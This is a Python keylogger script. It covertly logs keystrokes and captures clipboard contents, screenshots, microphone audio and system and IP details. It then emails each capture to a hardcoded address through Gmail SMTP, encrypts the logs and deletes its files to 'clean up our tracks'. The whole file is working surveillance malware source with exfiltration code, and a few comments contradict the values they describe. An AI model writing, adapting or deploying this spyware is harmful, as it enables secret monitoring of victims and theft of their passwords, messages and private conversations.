# to get usernames
import getpass
import os
import platform
import smtplib
import socket
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import sounddevice as sd
import win32clipboard
from PIL import ImageGrab
from cryptography import fernet
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write


#creating a file to store stuff

keys_information = "keylogger.txt"
# variable to store system variable 
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "devicescreenshot.png"

keys_information_e = "e_keylogger.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 5 # 5 seconds of recording time 
time_iteration = 20 # 10 seconds 
# number of iterations for each functionality 
number_of_iterations_end = 1

# FROM email address 
email_address = "example@gmail.com"
pwd = "example"

username = getpass.getuser()

# TO email address
receiversaddr = "myaddress@gmail.com"

key = "Yx1pFB4rpMl8CiU_TvlbS9GCmB3pj1sJnzPg1986ao8="


file_path = "../system logs" # enter the file path of 'Saved Logs' folder !!
extend = "\\"
file_merge = file_path + extend

# getting the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address is : " + public_ip)


        except Exception:
            f.write("Couldn't get Public IP Address")


        f.write("Device Processor is : " + (platform.processor()) + '\n')
        f.write("General System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine Info : " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address is : " + IPAddr + "\n")


computer_information()

def copy_clipboard():

    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        # if the clipboard content is non-string
        except:
            f.write("Clipboard could be not be copied")

# end of function 
# calling this function 
copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

def send_email(filename, attachment, receiversaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = receiversaddr
    msg['Subject'] = "Log File"
    body = "Having fun with the keylogger yet?"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    # encoding our message 
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, pwd)
    text = msg.as_string()
    
    #sending the email after completing everything
    s.sendmail(fromaddr, receiversaddr, text)
    print ('email sent') #checking purpose 
    # quitting SMTP session after mail is sent
    s.quit()

# end of function 

#main file
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            # formatting the key-logger text file in a convienient way
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime > stoppingTime: #when the execution of the keylogger is over, it's time to send the mail
        

        send_email(keys_information, file_path + extend + keys_information, receiversaddr)
        
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, receiversaddr)
        
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information, receiversaddr)

        computer_information()
        send_email(system_information, file_path + extend + system_information, receiversaddr)
        
        microphone()
        send_email(audio_information, file_path + extend + audio_information, receiversaddr)
        #ending calling functions part


        number_of_iterations += 1

        currentTime = time.time()
        
        stoppingTime = time.time() + time_iteration
  


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    # rb - 'read binary'
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    # send the encrypted files to our email
    count += 1

# after each iteration, let the system rest for 2mins
time.sleep(50)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)